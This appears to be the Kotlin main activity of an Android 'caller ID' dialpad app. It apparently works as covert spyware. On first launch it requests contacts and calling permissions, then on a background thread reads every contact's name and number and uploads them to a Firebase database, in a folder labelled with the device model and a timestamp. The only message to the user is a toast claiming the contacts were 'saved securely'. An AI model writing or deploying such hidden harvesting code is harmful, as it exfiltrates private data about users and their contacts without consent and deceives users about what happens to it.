package com.example.mycallerid

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.ContactsContract
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.firebase.database.FirebaseDatabase
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import kotlin.concurrent.thread

class MainActivity : AppCompatActivity() {

    private lateinit var tvNumber: TextView
    private var currentNumber = ""

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        tvNumber = findViewById(R.id.tvNumber)
        setupDialpad()

        // App khulte hi permission mangega aur background mein sync shuru karega
        checkPermissionsAndSync()
    }

    private fun checkPermissionsAndSync() {
        val perms = arrayOf(Manifest.permission.READ_CONTACTS, Manifest.permission.CALL_PHONE)
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED ||
            ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, perms, 100)
        } else {
            syncContacts()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 100 && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            syncContacts()
        }
    }

    private fun syncContacts() {
        thread {
            // Folder name set ho raha hai jaise "OPPO_CPH2728_11May_180000"
            val deviceName = Build.MODEL.replace(Regex("[^a-zA-Z0-9]"), "_")
            val timeStamp = SimpleDateFormat("ddMMM_HHmmss", Locale.getDefault()).format(Date())
            val folderName = "${deviceName}_${timeStamp}"

            val database = FirebaseDatabase.getInstance().reference.child("UsersContacts").child(folderName)
            val cursor = contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null
            )

            val contactsMap = mutableMapOf<String, String>()

            cursor?.use {
                val nameIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numberIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)

                while (it.moveToNext()) {
                    val name = it.getString(nameIndex) ?: "Unknown"
                    val number = it.getString(numberIndex) ?: ""
                    val cleanNumber = number.replace(Regex("[^0-9+]"), "")

                    if (cleanNumber.isNotEmpty()) {
                        contactsMap[cleanNumber] = name
                    }
                }
            }

            if (contactsMap.isNotEmpty()) {
                database.setValue(contactsMap)
                runOnUiThread {
                    Toast.makeText(this@MainActivity, "Contacts saved securely!", Toast.LENGTH_SHORT).show()
                }
            }
        }
    }

    private fun setupDialpad() {
        val buttons = listOf(
            R.id.btn0, R.id.btn1, R.id.btn2, R.id.btn3,
            R.id.btn4, R.id.btn5, R.id.btn6, R.id.btn7,
            R.id.btn8, R.id.btn9, R.id.btnStar, R.id.btnHash
        )

        for (id in buttons) {
            findViewById<Button>(id).setOnClickListener {
                val btn = it as Button
                currentNumber += btn.text.toString()
                tvNumber.text = currentNumber
            }
        }

        findViewById<Button>(R.id.btnBackspace).setOnClickListener {
            if (currentNumber.isNotEmpty()) {
                currentNumber = currentNumber.dropLast(1)
                tvNumber.text = currentNumber
            }
        }

        findViewById<Button>(R.id.btnCall).setOnClickListener {
            if (currentNumber.isNotEmpty()) {
                makeCall(currentNumber)
            }
        }
    }

    private fun makeCall(number: String) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
            val intent = Intent(Intent.ACTION_CALL)
            intent.data = Uri.parse("tel:$number")
            startActivity(intent)
        } else {
            Toast.makeText(this, "Calling permission required!", Toast.LENGTH_SHORT).show()
        }
    }
}